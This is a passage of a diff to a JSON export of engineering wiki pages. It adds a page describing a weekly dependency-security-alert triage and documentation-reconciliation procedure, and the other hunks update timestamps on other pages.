(it's the audit trail). If a whole package's alerts all closed, note it.\n- New alerts — add a row in the correct service table, fully triaged, with Remediated? = No, Date triaged = today, Date remediated = —.\n- Still-open alerts — leave Remediated = No; if the triage verdict or code-path reasoning changed since last week (e.g. usage changed, a patched version now exists, severity reassessed), update that row's cells and note the change.\n- Re-verify \"material\" findings specifically — these drive action, so double-check each one's code path still exists and still reaches attacker input.\n- Update the per-section summary counts (e.g. \"N open critical alerts; M materially exploitable\") and the bottom High severity summary list of material findings.\nUse notion-update-page with update_content (targeted search/replace on <td> cells) for incremental edits; only use insert_content for genuinely new rows/tables. Match the existing Notion-flavored table markup exactly.\n## Step 4 — Report back\nIn your reply to the user, give a concise changelog since last week:\n• Newly remediated (alerts that closed) — with package + alert #.\n• Newly opened — with package, alert #, and material/not verdict.\n• Current material findings — the full list of YES rows across critical + high, since these are what need tickets/action. Flag any that are new this week or newly unblocked (patched version now available).\n• Any alerts that look stale (e.g. installed version already exceeds the patched version — should auto-close) so they can be manually dismissed.\nDo not create Linear tickets or make code changes unless explicitly asked — this command's job is triage + doc reconciliation only.",
+      "keywords": [
+        "security",
+        "audit",
+        "vulnerability",
+        "sso",
+        "saml",
+        "api"
+      ],
+      "lastUpdated": "2026-09-13T02:08:52.195Z"
     },
     {
       "id": "3a0a8dad-05ac-8058-8938-d5863d64095d",
@@ -1292,7 +1346,7 @@
       "parent": "Engineering Wiki",
       "content": "",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:03:23.114Z"
+      "lastUpdated": "2026-09-13T02:08:52.958Z"
     },
     {
       "id": "3a0a8dad-05ac-80fc-9b98-fc7ec82170de",
@@ -1300,7 +1354,7 @@
       "parent": "2026 Q3 Hackathon ",
       "content": "Author: @Jennifer Hsu \nQuestion in Pure Organics: ",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:03:23.452Z"
+      "lastUpdated": "2026-09-13T02:08:53.240Z"
     },
     {
       "id": "129a8dad05ac801cb803e69297ecf8c7",
@@ -1327,7 +1381,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2026-08-02T03:03:24.604Z"
+      "lastUpdated": "2026-09-13T02:08:54.153Z"
     },
     {
       "id": "29ca8dad-05ac-80f3-9e55-cbb965b5b401",
@@ -1341,7 +1395,7 @@
         "rpo",
         "rto"
       ],
-      "lastUpdated": "2026-08-02T03:03:25.103Z"
+      "lastUpdated": "2026-09-13T02:08:55.631Z"
     }
   ]
 }
